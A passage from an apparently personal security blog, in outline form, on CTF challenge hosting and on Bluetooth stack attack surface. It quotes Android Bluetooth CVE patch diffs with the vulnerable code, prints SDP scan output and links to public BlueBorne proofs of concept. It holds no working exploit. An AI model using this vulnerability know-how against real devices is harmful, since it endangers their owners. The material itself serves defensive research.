		  An example of cool stuff people are doing with hardware is the [Riscure Embedded Hardware Challenge](https://www.youtube.com/watch?v=u_U6F2Kkbb0) which gave contestants an arduino with CAN bus firmware. I hope to see more of this stuff in the future since hardware security (IoT, cars,  routers, etc.) has become the talk of the town.
		- ## 🏎️ Where the code be?
		  
		  You can check out the shitty APK submission server I put together [here](https://github.com/breadchris/apk-submission-queue). If you feel inclined to work on making this better, I will for sure work with you on your PRs.
	- 2018-06-10-making-h1-ctfs
		- Hackerone has given me the opportunity to throw together some CTF challenges and put them in front of a huge audience and for that I think it has been a pretty cool experience. The problems that I have focused on writing
		- ## What makes h1-ctfs so special?
		  
		  Hackerone hackers are the coolest hackers. They all come from different backrounds and are some of the most contemplative, patient, and interesting people you will meet. Having fostered such a great community, events like h1-ctfs are a joy to put on. The goal of an h1-ctf is to not only to find the best technical talent, but to also find those who are really stellar reporters too. The winners of these events should embrace what it means to be a bug bounty researcher.
		  
		  The winners for every h1-ctf get a free trip to where ever the h1 event is being held (vegas - 702 and D.C. - 202). This incentive is too good not to give it your all during this competition and when paired with interesting problems, you get some really good work. h1-ctfs capture this work in the writeups we require participants to do so that we can not only see that they solved it, but can communicate their solution with us.
		- ## Where are the links to h1-ctf writeups?
		  
		  I think what I have been most impressed by is the quality of writeups that we receive from contestants. Having to decide the winner is sometimes very difficult as each submission has something that the other does not. After reading over each one again and again, it begins to come clear which ones really stand out as consistently dense with information and explaination. It is not to say an elegant, simple writeup would not fair well, a really good writeup is one that can succinctly describe why a solution works starting with the nuts and bolts of the challenge. I writeup that I thought was really good was [Lucio's challenge 5 writeup](https://github.com/luc10/h1-702-2018-ctf-wu/blob/master/write-ups/challenge-5.md).
		- ## Where can I go to checkout the problems?
		  
		  Here is the [repo](https://github.com/Hacker0x01/h1-ctf-archives) where you can find all of these problems.
	- 2019-08-01-bluetooth-pwning
		- Note: I am a lazy fuck and I have been putting off this post for a while so I just dumped some stuff in my text editor and put it up. I plan to refine this periodically over time. I will leave notes here while I update it. If this stuff is useful to you and you are running into problems setting stuff up or whatever, PM me on twitter.
		  
		  I started digging into bluetooth stacks after Armis announced its series of vulnerabilities affecting Linux, Android, iOS, and Windows, which they named [Bluebourne](https://www.armis.com/blueborne/). This paper [explaining the vulnerabilities](https://go.armis.com/hubfs/BlueBorne%20Technical%20White%20Paper-1.pdf) as well as the follow up [explaining the exploitation](https://go.armis.com/hubfs/BlueBorne%20-%20Android%20Exploit%20(20171130).pdf) were very well written and I highly recommend you take a look at them. If you want to run their POC, you can check it out [here](https://github.com/ArmisSecurity/blueborne), and if you want to adopt this POC to your device, take a look at [this](https://jesux.es/exploiting/blueborne-android-6.0.1-english/).
		  
		  Trying to make sense of these disclosed vulnerabilities, along with their POCs, I tried to find some online resources to help me out. There were a lot of interesting projects dealing with the application layer of bluetooth and how applications which use this technology expose themselves to potential issues. But, there was very little in the way of analyzing the actual bluetooth stack which enables these higher level applications.
		  
		  TODO: resources that I found.
		  
		  I initially wanted to be able to speak the protocol in hopes I could write a fuzzer or something to shake some bugs out of bluetooth stack code. Bluekitchen's bluetooth documentation and implementation helped immensely as I had a means of sending data to a target device.
		  
		  I searched for vulnerabilities in Android for a while with no luck. But over the period of time in this research I learned a great deal about Bluetooth and watched as seasoned bug finding veterans crushed this source code.
		  
		  The initial post I want to make will just outline different components of Bluetooth and how they relate to each other. Additionally, I want to point out the attack surface of these components and vulnerabilities in these components within their implementation (mostly Android).
		  
		  I will be following this post up with some helpful instructions for running and debugging Bluetooth POCs to help with your own bug hunting.
		- # Bluetooth enabled things
		  A bunch of things use bluetooth, here are some stack implementations I am aware of:
		  * MacOS Stack - written in objc
		  * iOS Stack - written in c
		  * Android (fluoride)
		  * BTStack
		  * mynewt
		  * nimble - zephyr
		  * Windows
		  * Toshiba
		  * Linux (bluez)
		  * Car entertainment systems
		- # HCI
		- ## Notable features
		  * Interfaces with the bluetooth controller - For example, whenever a packet is sent, the controller will tell the stack how many packets were sent via HCI (TODO image)
		  * [Scapy](https://sourcegraph.com/github.com/secdev/scapy/-/blob/scapy/layers/bluetooth.py#L155)
		  * The difference between BR/EDR and LE
		  * [GAP for LE](https://learn.adafruit.com/introduction-to-bluetooth-low-energy/gap)
		  * A common naming convention for packet buffers is `pdu` ([protocol data unit](https://en.wikipedia.org/wiki/Protocol_data_unit))
		  * For l2cap, HCI creates `handles` which it passes up after a successful connection
		  * Link Manager Protocol (LMP) is also worth mentioning here as it "The Link Manager carries out link setup, authentication, link configuration and other protocols. It discovers other remote LM’s and communicates with them via the Link Manager Protocol (LMP)." ([info](https://www.amd.e-technik.uni-rostock.de/ma/gol/lectures/wirlec/bluetooth_info/lmp.html))
		  * [GAP](https://bluekitchen-gmbh.com/btstack/profiles/#gap-generic-access-profile-classic)
		  * [GAP LE](https://bluekitchen-gmbh.com/btstack/profiles/#gap-le-generic-access-profile-for-low-energy)
		- ## Attack Surface
		  * Not a whole lot going on since this layer is just in charge of talking to a controller and passing data along to higher levels
		  * ECC attack for MiTM (TODO: Link)
		  * What is interesting about the attack surface is that for each protocol, Android has a server and a client. For example, the Android phone can receive and parse SDP packets, as well as send them to a device it is in the process of connecting to. While we would typically need to find some triggering condition to have the client issue requests from us and parse their response, this is an interesting attack surface as it might be less likely developers will think about the security of parsing the response from the server. As we will see in the various protocol client applications, this was indeed the case.
		- ## Stack Implementations
		  [Scapy](https://sourcegraph.com/github.com/secdev/scapy/-/blob/scapy/layers/bluetooth.py#L155)
		  Scapy gives a nice overview of how packets are structured, but because of the weirdness of the bluetooth protocol, this information only gets you so far.
		  
		  If you want to dig into the details of Bluetooth, I recommend looking through Bluekitchen's btstack. Here is BTStack's main hci [event handler](https://github.com/bluekitchen/btstack/blob/d966a453850a16585ca5c468190532d5cbf0d844/src/hci.c#L1856).
		  
		  HCI is not entirely interesting, it is mainly used for configuring the Bluetooth controller, creating/configuring connections and sending/receiving data to devices (power on, off, start advertising le data, create connection). (TODO: Link to btstack hci_cmd.c)
		  
		  More information on HCI can be found [here](https://bluekitchen-gmbh.com/btstack/protocols/#hci-host-controller-interface)
		- ## CVEs
		  I don't know if there are any?
		- # L2CAP
		- ## Notable features
		  * Basically the TCP of Bluetooth
			- Packet retransmission/reassembly - potentially sketchy code (TODO link to different implementations)
			- Both client and server send each other their `mtu`s (max transmission unit) to specify how much data they can send (one of the vulnerabilities in the BlueBourne research used this to trigger a vuln TODO: link)
			  * Static vs. Dynamic channels
			- There are some pre-defined ranges by the bluetooth standard
			- The channels are different for br/edr and le connections
			- A protocol is identified by a `psm` (e.g. SDP has psm 1, ATT has psm 7, a really good list can be found in bluez's sdptool sdptool.c:259, when we get to SDP we will look at this more)
			- After connecting to a protocol, the are given a `cid` (channel id) which lets you send acl (data) packets to
			  * Signalling Channel
			- The entrypoint for creating and configuring channels with a remote device (btstack l2cap_signalling.c:53)
			  * classic (br/edr) and low-energy (le) exist in l2cap, their code paths somewhat merge
			- This can be seen in btstack/src/l2cap.c:3443
		- ## Attack Surface
		  * Channels and their state are created and stored within the stack, abusing the state machine could lead to use-after-frees
		  
		  TODO: Go through each bluetooth stack and show what channels are registered (point out the weird iOS stuff)
		- ## Stack Comparisions
		- ## CVEs
		  * CVE-2017-0781 RCE (Allocate buffers of the right size when BT_HDR is included) [diff](https://android.googlesource.com/platform/system/bt/+/c513a8ff5cfdcc62cc14da354beb1dd22e56be0e)
			- Vuln used by Bluebourne in their exploit POC, the code when run would cause a heap overflow due to the allocation being too small
			  {% highlight c lineanchors %}
			  p_bcb->p_pending_data = (BT_HDR*)osi_malloc(rem_len + sizeof(BT_HDR));
			  memcpy((uint8_t*)(p_bcb->p_pending_data + 1), p, rem_len);
			  {% endhighlight %}
			  * CVE-2018-9359 Fix OOB read in process_l2cap_cmd (signalling commands ID) [diff](https://android.googlesource.com/platform/system/bt/+/b66fc16410ff96e9119f8eb282e67960e79075c8)
			- Pretty much no signalling commands were checking minimum length and variables read from the packet were sent back to the user
			- Check out the [Quarkslab writeup](https://blog.quarkslab.com/a-story-about-three-bluetooth-vulnerabilities-in-android.html)
			  * CVE-2018-9419	l2c ble ID [diff](https://android.googlesource.com/platform/system/bt/+/f1c2c86080bcd7b3142ff821441696fc99c2bc9a)
			- End of packet is not checked, bytes can be leaked
			- Check out the [Quarkslab writeup](https://blog.quarkslab.com/a-story-about-three-bluetooth-vulnerabilities-in-android.html)
			  {% highlight c lineanchors %}
			   case L2CAP_CMD_DISC_REQ:
			  +      if (p + 4 > p_pkt_end) {
			  +        android_errorWriteLog(0x534e4554, "74121659");
			  +        return;
			  +      }
			  {% endhighlight %}
			  * CVE-2018-9555	l2cap RCE [diff](https://android.googlesource.com/platform/system/bt/+/02fc52878d8dba16b860fbdf415b6e4425922b2c)
			- This code is difficult to hit as you need to have an LE data channel listening for connections (most LE connections interact with GATT)
			  {% highlight c lineanchors %}
			  +    if (sdu_length < p_buf->len) {
			  +      L2CAP_TRACE_ERROR("%s: Invalid sdu_length: %d", __func__, sdu_length);
			  +      android_errorWriteWithInfoLog(0x534e4554, "112321180", -1, NULL, 0);
			  +      /* Discard the buffer */
			  +      osi_free(p_buf);
			  +      return;
			  +    }
			  {% endhighlight %}
			  * ble l2cap retransmission RCE (regression of CVE-2018-9555) [diff](https://android.googlesource.com/platform/system/bt/+/488aa8befd5bdffed6cfca7a399d2266ffd201fb)
			  {% highlight c lineanchors %}
			  void l2c_lcc_proc_pdu(tL2C_CCB* p_ccb, BT_HDR* p_buf) {
			  uint8_t* p = (uint8_t*)(p_buf + 1) + p_buf->offset;
			  uint16_t sdu_length;
			  /* Buffer length should not exceed local mps */
			  if (p_buf->len > p_ccb->local_conn_cfg.mps) {
			  /* Discard the buffer */
			  }
			  if (p_ccb->is_first_seg) {
			  // If we do not have this check, then p_buf->len can be 0 or 1
			  if (p_buf->len < sizeof(sdu_length)) {
			    /* Discard the buffer */
			  }
			  
			  STREAM_TO_UINT16(sdu_length, p);
			  /* Check the SDU Length with local MTU size */
			  if (sdu_length > p_ccb->local_conn_cfg.mtu) {
			    /* Discard the buffer */
			  }
			  if (sdu_length < p_buf->len) {
			    /* Discard the buffer */
			  }
			  p_data = (BT_HDR*)osi_malloc(BT_HDR_SIZE + sdu_length);
			  
			  p_buf->len -= sizeof(sdu_length);
			  }
			  
			  // p_buf->len could be super huge
			  memcpy((uint8_t*)(p_data + 1) + p_data->offset + p_data->len,
			       (uint8_t*)(p_buf + 1) + p_buf->offset, p_buf->len);
			  {% endhighlight %}
			  * CVE-2018-9485	L2ble OOB read [diff](https://android.googlesource.com/platform/system/bt/+/bdbabb2ca4ebb4dc5971d3d42cb12f8048e23a23)
			  * End of packet is never checked for an le l2cap configuration request
			  {% highlight c lineanchors %}
			  p_pkt_end = p + pkt_len;
			  
			  +  if (p + 4 > p_pkt_end) {
			  +    android_errorWriteLog(0x534e4554, "80261585");
			  +    LOG(ERROR) << "invalid read";
			  +    return;
			  +  }
			  +
			  STREAM_TO_UINT8(cmd_code, p);
			  STREAM_TO_UINT8(id, p);
			  STREAM_TO_UINT16(cmd_len, p);
			  {% endhighlight %}
			  * CVE-2018-9486 l2cap check length [diff](https://android.googlesource.com/platform/system/bt/+/bc6aef4f29387d07e0c638c9db810c6c1193f75b)
			  {% highlight c lineanchors %}
			  static void hidh_l2cif_data_ind(uint16_t l2cap_cid, BT_HDR* p_msg) {
			  ...
			  +  if (p_msg->len < 1) {
			  +    HIDH_TRACE_WARNING("Rcvd L2CAP data, invalid length %d, should be >= 1",
			  +                       p_msg->len);
			  +    osi_free(p_msg);
			  +    android_errorWriteLog(0x534e4554, "80493272");
			  +    return;
			  +  }
			  +
			  ttype = HID_GET_TRANS_FROM_HDR(*p_data); // p_data has data from the server that will get leaked
			  param = HID_GET_PARAM_FROM_HDR(*p_data);
			  rep_type = param & HID_PAR_REP_TYPE_MASK;
			  {% endhighlight %}
			  * CVE-2018-9484 Out of Bounds read in l2cap [diff](https://android.googlesource.com/platform/system/bt/+/d5b44f6522c3294d6f5fd71bc6670f625f716460)
			- you can position p and get data out
			  {% highlight c lineanchors %}
			  if ((cfg_len + L2CAP_CFG_OPTION_OVERHEAD) <= cmd_len) {
			  + if (p + cfg_len > p_next_cmd) return;
			  {% endhighlight %}
			  
			  * [Hell2cap](https://www.cymotive.com/wp-content/uploads/2019/03/Hell2CAP-0day.pdf) (stupid named vulns :P)
			  * [Tesla Keen Team report](https://www.blackhat.com/docs/us-17/thursday/us-17-Nie-Free-Fall-Hacking-Tesla-From-Wireless-To-CAN-Bus-wp.pdf)
		- ## Interactive Example
		  Let's run through an example POC
		  
		  // TODO
		- # SM and SMP
		- ## SMP - Notable Features
		- Capabilities and security levels
		  Security Levels:
		  [btstack](https://sourcegraph.com/github.com/bluekitchen/btstack@develop/-/blob/src/l2cap.c#L2232:64)
		  [fluoride](https://android.googlesource.com/platform/system/bt/+/refs/heads/master/stack/btm/btm_sec.cc#2248)
		  [nimble](https://github.com/apache/mynewt-nimble/blob/2d3705b94f7b5d2493c71abb5ba4d33b3d763735/apps/bttester/src/gap.c#L1079)
		  [bluez](https://sourcegraph.com/github.com/torvalds/linux@master/-/blob/net/bluetooth/l2cap_core.c#L815)
		- ## SM - Notable Features
		  // TODO
		- ## CVEs
		- ### Android
		  * CVE-2019-1991	RCE in SMP [diff](https://android.googlesource.com/platform/system/bt/+/3d21e75aa8c1e0c4adf178a1330f9f5c573ca045)
		  * CVE-2018-9507	ID in SMP [diff](https://android.googlesource.com/platform/system/bt/+/e8bbf5b0889790cf8616f4004867f0ff656f0551)
		  * CVE-2018-9509	ID in SMP [diff](https://android.googlesource.com/platform/system/bt/+/198888b8e0163bab7a417161c63e483804ae8e31)
		  * CVE-2018-9510	ID in SMP [diff](https://android.googlesource.com/platform/system/bt/+/6e4b8e505173f803a5fc05abc09f64eef89dc308)
		  * CVE-2018-9446 RCE SMP (Check p_cb->role in smp_br_state_machine_event) [diff](https://android.googlesource.com/platform/system/bt/+/49acada519d088d8edf37e48640c76ea5c70e010)
		  * Attacker supplied p_cb->role had ended up being used to lookup index in smp_br_state_table, letting you specify what function you wanted to call
		  * also in [CVE-2018-9365](https://android.googlesource.com/platform/system/bt/+/ae94a4c333417a1829030c4d87a58ab7f1401308)
		  * This was discovered by [Quarkslab](https://blog.quarkslab.com/a-story-about-three-bluetooth-vulnerabilities-in-android.html)
		  
		  {% highlight c lineanchors %}
		  if (p_cb->role > HCI_ROLE_SLAVE) { --> state_table = smp_br_state_table[curr_state][p_cb->role];
		  {% endhighlight %}
		  
		  * SMP [use after free](https://android.googlesource.com/platform/system/bt/+/fe621261a1f66463df71cfef2bdd037374e3c6b2)
		- # SDP
		  
		  This is probably the most sketch protocol in Bluetooth. There is a lot going on with the protocol and it is required to be exposed to all devices so they know what applications the device has registered (e.g. can I send music to you? yes! I have AV controller!). Granted, devices that operate only with BLE do not have this since information is advertised via GATT. However, all mobile devices, cars, and things that need compatability with older protocols will be listening for SDP
		- ## Notable Features
		  * The SDP `server` handles remote queries of the SDP database which contains information for all registered services for the device. For example...
		  * Each Bluetooth protocol is assigned a specific number defined by the [specification](https://www.bluetooth.com/specifications/assigned-numbers/service-discovery/)
		  * Higher level applications register themselves to the `server` via the internal SDP API the server exposes (as seen here in btstack for PAN: ). These applications identify themselves to remote devices using `service class identifiers` ([Bluez](https://git.kernel.org/pub/scm/bluetooth/bluez.git/tree/lib/sdp.h#n78))
		  * Each of these higher level protocols use different `data elements` (below) to convey to a remote device how the application is configured (metadata about the bluetooth application), these are identified by `service attribute definitions` (seen here in [Bluez](https://git.kernel.org/pub/scm/bluetooth/bluez.git/tree/lib/sdp.h#n250)). For example, here is the SDP registration specification for PAN. We can see btstack specifically parsing an RFCOMM SDP entry: `examples/sdp_rfcomm_query.c`
		  * The SDP `client` performs queries and parses their response
		  * There are three different queries which can be performed: (TODO fill in these details)
		  * ServiceSearchRequest
		  * ServiceAttributeRequest
		  * ServiceSearchAttributeRequest
		  * Queries are comprised of `data elements` which are type, length, value structures (seen here: btstack sdp_util.h:105)
		  * These `data elements`
		  * The parsing is relatively complex, I think bluez's implementation is the [clearest](https://git.kernel.org/pub/scm/bluetooth/bluez.git/tree/lib/sdp.c)
		  
		  * If a response is too big, a `continuation state` is created (TODO: Reference specification)
		  * This `continuation state` has led to a number of vulnerabilities with Android (TODO: refs) due to the server either trusting the client's state or the internal state becomes corrupt and lengths become out of sync (TODO: ref bluebourne exploit leak)
		- ## Attack Surface
		  * Since every device must always expose their SDP server (allow JustWorks pairing, see HCI/L2cap) to all nearby devices to tell them what sevices are accessible on the device, this provides a nice no-interaction attack surface. Additionally, a given bluetooth stack might have some sort of automated trigger (see iOS Airpod discovery) which causes it to use its SDP client to send a request and parse a response from the attacker's device. Again, a no-interaction needed attack surface. 
		  * The SDP protocol is sufficiently complex to most likely contain bugs in any implementation, as shown in researchers digging through Android.
		  
		  TODO: Run sdp tool on each stack
		  
		  {% highlight bash lineanchors %}
		  ➜  libusb-intel git:(fuzzable) ✗ sudo ./sdp_l2cap_scan --address 38:CA:DA:85:5F:E1
		  Packet Log: /tmp/hci_dump.pklg
		  USB Path: 07
		  Client HCI init done
		  BTstack up and running on 18:56:80:04:42:72.
		  
		  ---
		  Record nr. 0
		  sdp attribute: 0x0004
		  summary: uuid 0x0003, l2cap_psm: 0x0000
		  
		  ---
		  Record nr. 1
		  sdp attribute: 0x0004
		  summary: uuid 0x0100, l2cap_psm: 0x000f, name: BNEP
		  summary: uuid 0x000f, l2cap_psm: 0x0100, name: L2CAP
		  
		  ---
		  Record nr. 2
		  sdp attribute: 0x0004
		  summary: uuid 0x0003, l2cap_psm: 0x0000
		  
		  ---
		  Record nr. 3
		  sdp attribute: 0x0004
		  summary: uuid 0x0003, l2cap_psm: 0x0000
		  
		  ---
		  Record nr. 4
		  sdp attribute: 0x0004
		  summary: uuid 0x0100, l2cap_psm: 0x0017, name: AVCTP
		  summary: uuid 0x0017, l2cap_psm: 0x0104
		  
		  ---
		  Record nr. 5
		  sdp attribute: 0x0004
		  summary: uuid 0x0100, l2cap_psm: 0x0017, name: AVCTP
		  summary: uuid 0x0017, l2cap_psm: 0x0104
		  
		  ---
		  Record nr. 6
		  sdp attribute: 0x0004
		  summary: uuid 0x0100, l2cap_psm: 0x0019, name: AVDTP
		  summary: uuid 0x0019, l2cap_psm: 0x0103
		  
		  ---
		  Record nr. 7
		  sdp attribute: 0x0004
		  summary: uuid 0x0003, l2cap_psm: 0x0000
		  
		  ---
		  Record nr. 8
		  sdp attribute: 0x0004
		  summary: uuid 0x0003, l2cap_psm: 0x0000
		  
		  ---
		  {% endhighlight %}
		  
		  This code just dumps out relavant info for understanding the BR/EDR attack surface of a device. For a more comprehensive view of what data SDP holds, check out this full SDP dump for the same device:
		  
		  {% highlight bash lineanchors %}
		  ➜  libusb-intel git:(master) ✗ sudo ./sdp_general_query 
		  [sudo] password for breadchris: 
		  Packet Log: /tmp/hci_dump.pklg
		  USB Path: 07
		  Done 0
		  Client HCI init done
		  BTstack up and running on 18:56:80:04:42:72.
		  
		  ---
		  Record nr. 0
		  Attribute 0x0001: type   DES (6), element len  5 
		    type  UUID (3), element len  3 , value: 0x00001132
		  Attribute 0x0002: type  UINT (1), element len  5 , value: 0x00000000
		  Attribute 0x0004: type   DES (6), element len 19 
		    type   DES (6), element len  5 
		        type  UUID (3), element len  3 , value: 0x00000100
		    type   DES (6), element len  7 
		        type  UUID (3), element len  3 , value: 0x00000003
		        type  UINT (1), element len  2 , value: 0x00000002
		    type   DES (6), element len  5 
		        type  UUID (3), element len  3 , value: 0x00000008
		  Attribute 0x0005: type   DES (6), element len  5 
		    type  UUID (3), element len  3 , value: 0x00001002
		  Attribute 0x0006: type   DES (6), element len 38 
		    type  UINT (1), element len  3 , value: 0x0000656e
		    type  UINT (1), element len  3 , value: 0x0000006a
		    type  UINT (1), element len  3 , value: 0x00000100
		    type  UINT (1), element len  3 , value: 0x00006672
		    type  UINT (1), element len  3 , value: 0x0000006a
		    type  UINT (1), element len  3 , value: 0x00000110
		    type  UINT (1), element len  3 , value: 0x00006465
		    type  UINT (1), element len  3 , value: 0x0000006a
		    type  UINT (1), element len  3 , value: 0x00000120
		    type  UINT (1), element len  3 , value: 0x00006a61
		    type  UINT (1), element len  3 , value: 0x0000006a
		    type  UINT (1), element len  3 , value: 0x00000130
		  Attribute 0x0008: type  UINT (1), element len  2 , value: 0x000000ff
		  Attribute 0x0009: type   DES (6), element len 10 
		    type   DES (6), element len  8 
		        type  UUID (3), element len  3 , value: 0x00001134
		        type  UINT (1), element len  3 , value: 0x00000100
		  Attribute 0x0100: type STRING (4), element len 13 len 11 (0x0b)
		  4D 41 50 20 4D 41 53 2D 69 4F 53 
		  Attribute 0x0315: type  UINT (1), element len  2 , value: 0x00000000
		  Attribute 0x0316: type  UINT (1), element len  2 , value: 0x0000000a
		  
		  ---
		  Record nr. 1
		  Attribute 0x0001: type   DES (6), element len  5 
		    type  UUID (3), element len  3 , value: 0x00001116
		  Attribute 0x0002: type  UINT (1), element len  5 , value: 0x00000018
		  Attribute 0x0004: type   DES (6), element len 32 
		    type   DES (6), element len  8 
		        type  UUID (3), element len  3 , value: 0x00000100
		        type  UINT (1), element len  3 , value: 0x0000000f
		    type   DES (6), element len 22 
		        type  UUID (3), element len  3 , value: 0x0000000f
		        type  UINT (1), element len  3 , value: 0x00000100
		        type   DES (6), element len 14 
		            type  UINT (1), element len  3 , value: 0x00000800
		            type  UINT (1), element len  3 , value: 0x00000806
		            type  UINT (1), element len  3 , value: 0x00008100
		            type  UINT (1), element len  3 , value: 0x000086dd
		  Attribute 0x0005: type   DES (6), element len  5 
		    type  UUID (3), element len  3 , value: 0x00001002
		  Attribute 0x0006: type   DES (6), element len 38 
		    type  UINT (1), element len  3 , value: 0x0000656e
		    type  UINT (1), element len  3 , value: 0x0000006a
		    type  UINT (1), element len  3 , value: 0x00000100
		    type  UINT (1), element len  3 , value: 0x00006672
		    type  UINT (1), element len  3 , value: 0x0000006a
		    type  UINT (1), element len  3 , value: 0x00000110
		    type  UINT (1), element len  3 , value: 0x00006465
		    type  UINT (1), element len  3 , value: 0x0000006a
		    type  UINT (1), element len  3 , value: 0x00000120
		    type  UINT (1), element len  3 , value: 0x00006a61
		    type  UINT (1), element len  3 , value: 0x0000006a
		    type  UINT (1), element len  3 , value: 0x00000130
		  Attribute 0x0008: type  UINT (1), element len  2 , value: 0x00000000
		  Attribute 0x0009: type   DES (6), element len 10 
		    type   DES (6), element len  8 
		        type  UUID (3), element len  3 , value: 0x00001116
		        type  UINT (1), element len  3 , value: 0x00000100
		  Attribute 0x0100: type STRING (4), element len 28 len 26 (0x1a)
		  50 41 4E 20 4E 65 74 77 6F 72 6B 20 41 63 63 65 73 73 20 50 72 6F 66 69 6C 65 
		  Attribute 0x0101: type STRING (4), element len 22 len 20 (0x14)
		  4E 65 74 77 6F 72 6B 20 41 63 63 65 73 73 20 50 6F 69 6E 74 
		  Attribute 0x030a: type  UINT (1), element len  3 , value: 0x00000001
		  Attribute 0x030b: type  UINT (1), element len  3 , value: 0x0000000d
		  Attribute 0x030c: type  UINT (1), element len  5 , value: 0x0003e800
		  
		  ---
		  Record nr. 2
		  Attribute 0x0001: type   DES (6), element len 19 
		    type  UUID (3), element len 17 , value: 02030302-1D19-415F-86F2-22A2106A0A77
		  Attribute 0x0002: type  UINT (1), element len  5 , value: 0x00000000
		  Attribute 0x0004: type   DES (6), element len 14 
		    type   DES (6), element len  5 
		        type  UUID (3), element len  3 , value: 0x00000100
		    type   DES (6), element len  7 
		        type  UUID (3), element len  3 , value: 0x00000003
		        type  UINT (1), element len  2 , value: 0x00000001
		  ...
		  {% endhighlight %}
		- ## CVEs
		- ### Android
		  * CVE-2018-9478	SDP RCE [diff](https://android.googlesource.com/platform/system/bt/+/68688194eade113ad31687a730e8d4102ada58d5)
			- Hard to exploit: You can cause memcpy to copy a huge amount of bytes onto the heap, but where you need to control data to write the heap cookie you aren't able to control it.
			- More details in the [presentation](https://github.com/JiounDai/Bluedroid/blob/master/Dissect%20Android%20Bluetooth%20for%20Fun%20%26%20Profit.pdf)
			  * CVE-2018-9590	SDP ID [diff](https://android.googlesource.com/platform/system/bt/+/297598898683b81e921474e6e74c0ddaedbb8bb5)
			  {% highlight c lineanchors %}
			  diff --git a/stack/sdp/sdp_discovery.cc b/stack/sdp/sdp_discovery.cc
			  index 95f55bf..1ca2ad3 100644
			  --- a/stack/sdp/sdp_discovery.cc
			  +++ b/stack/sdp/sdp_discovery.cc
			  @@ -55,7 +55,7 @@
			  static uint8_t* save_attr_seq(tCONN_CB* p_ccb, uint8_t* p, uint8_t* p_msg_end);
			  static tSDP_DISC_REC* add_record(tSDP_DISCOVERY_DB* p_db,
			                              const RawAddress& p_bda);
			  -static uint8_t* add_attr(uint8_t* p, tSDP_DISCOVERY_DB* p_db,
			  +static uint8_t* add_attr(uint8_t* p, uint8_t* p_end, tSDP_DISCOVERY_DB* p_db,
			                      tSDP_DISC_REC* p_rec, uint16_t attr_id,
			                      tSDP_DISC_ATTR* p_parent_attr, uint8_t nest_level);
			  
			  @@ -770,7 +770,7 @@
			  BE_STREAM_TO_UINT16(attr_id, p);
			  
			  /* Now, add the attribute value */
		- p = add_attr(p, p_ccb->p_db, p_rec, attr_id, NULL, 0);
		  +    p = add_attr(p, p_seq_end, p_ccb->p_db, p_rec, attr_id, NULL, 0);
		  
		     if (!p) {
		       SDP_TRACE_WARNING("SDP - DB full add_attr");
		  @@ -830,7 +830,7 @@
		  * Returns          pointer to next byte in data stream
		  *
		  ******************************************************************************/
		  -static uint8_t* add_attr(uint8_t* p, tSDP_DISCOVERY_DB* p_db,
		  +static uint8_t* add_attr(uint8_t* p, uint8_t* p_end, tSDP_DISCOVERY_DB* p_db,
		                          tSDP_DISC_REC* p_rec, uint16_t attr_id,
		                          tSDP_DISC_ATTR* p_parent_attr, uint8_t nest_level) {
		   tSDP_DISC_ATTR* p_attr;
		  @@ -839,7 +839,7 @@
		   uint16_t attr_type;
		   uint16_t id;
		   uint8_t type;
		- uint8_t* p_end;
		  +  uint8_t* p_attr_end;
		   uint8_t is_additional_list = nest_level & SDP_ADDITIONAL_LIST_MASK;
		  
		   nest_level &= ~(SDP_ADDITIONAL_LIST_MASK);
		  @@ -856,6 +856,13 @@
		   else
		     total_len = sizeof(tSDP_DISC_ATTR);
		  
		  +  p_attr_end = p + attr_len;
		  +  if (p_attr_end > p_end) {
		  +    android_errorWriteLog(0x534e4554, "115900043");
		  +    SDP_TRACE_WARNING("%s: SDP - Attribute length beyond p_end", __func__);
		  +    return NULL;
		  +  }
		  +
		   /* Ensure it is a multiple of 4 */
		   total_len = (total_len + 3) & ~3;
		  
		  @@ -879,18 +886,17 @@
		            * sub-attributes */
		           p_db->p_free_mem += sizeof(tSDP_DISC_ATTR);
		           p_db->mem_free -= sizeof(tSDP_DISC_ATTR);
		- p_end = p + attr_len;
		           total_len = 0;
		  
		           /* SDP_TRACE_DEBUG ("SDP - attr nest level:%d(list)", nest_level); */
		           if (nest_level >= MAX_NEST_LEVELS) {
		             SDP_TRACE_ERROR("SDP - attr nesting too deep");
		- return (p_end);
		  +            return p_attr_end;
		           }
		  
		           /* Now, add the list entry */
		- p = add_attr(p, p_db, p_rec, ATTR_ID_PROTOCOL_DESC_LIST, p_attr,
		- (uint8_t)(nest_level + 1));
		  +          p = add_attr(p, p_end, p_db, p_rec, ATTR_ID_PROTOCOL_DESC_LIST,
		  +                       p_attr, (uint8_t)(nest_level + 1));
		  
		           break;
		         }
		  @@ -949,7 +955,7 @@
		           break;
		         default:
		           SDP_TRACE_WARNING("SDP - bad len in UUID attr: %d", attr_len);
		- return (p + attr_len);
		  +          return p_attr_end;
		       }
		       break;
		  
		  @@ -959,22 +965,22 @@
		        * sub-attributes */
		       p_db->p_free_mem += sizeof(tSDP_DISC_ATTR);
		       p_db->mem_free -= sizeof(tSDP_DISC_ATTR);
		- p_end = p + attr_len;
		       total_len = 0;
		  
		       /* SDP_TRACE_DEBUG ("SDP - attr nest level:%d", nest_level); */
		       if (nest_level >= MAX_NEST_LEVELS) {
		         SDP_TRACE_ERROR("SDP - attr nesting too deep");
		- return (p_end);
		  +        return p_attr_end;
		       }
		       if (is_additional_list != 0 ||
		           attr_id == ATTR_ID_ADDITION_PROTO_DESC_LISTS)
		         nest_level |= SDP_ADDITIONAL_LIST_MASK;
		       /* SDP_TRACE_DEBUG ("SDP - attr nest level:0x%x(finish)", nest_level); */
		- while (p < p_end) {
		  +      while (p < p_attr_end) {
		         /* Now, add the list entry */
		- p = add_attr(p, p_db, p_rec, 0, p_attr, (uint8_t)(nest_level + 1));
		  +        p = add_attr(p, p_end, p_db, p_rec, 0, p_attr,
		  +                     (uint8_t)(nest_level + 1));
		  
		         if (!p) return (NULL);
		       }
		  @@ -992,7 +998,7 @@
		           break;
		         default:
		           SDP_TRACE_WARNING("SDP - bad len in boolean attr: %d", attr_len);
		- return (p + attr_len);
		  +          return p_attr_end;
		       }
		       break;
		  
		  {% endhighlight %}
		  
		  * CVE-2018-9566	SDP ID [diff](https://android.googlesource.com/platform/system/bt/+/314336a22d781f54ed7394645a50f74d6743267d)
			- No length check
			  {% highlight c lineanchors %}
			  +  if (p_reply + 8 > p_reply_end) {
			  +    android_errorWriteLog(0x534e4554, "74249842");
			  +    sdp_disconnect(p_ccb, SDP_GENERIC_ERROR);
			  +    return;
			  +  }
			  /* Skip transaction, and param len */
			  p_reply += 4;
			  BE_STREAM_TO_UINT16(total, p_reply);
			  // ...
			  +  if (p_reply + ((p_ccb->num_handles - orig) * 4) + 1 > p_reply_end) {
			  +    android_errorWriteLog(0x534e4554, "74249842");
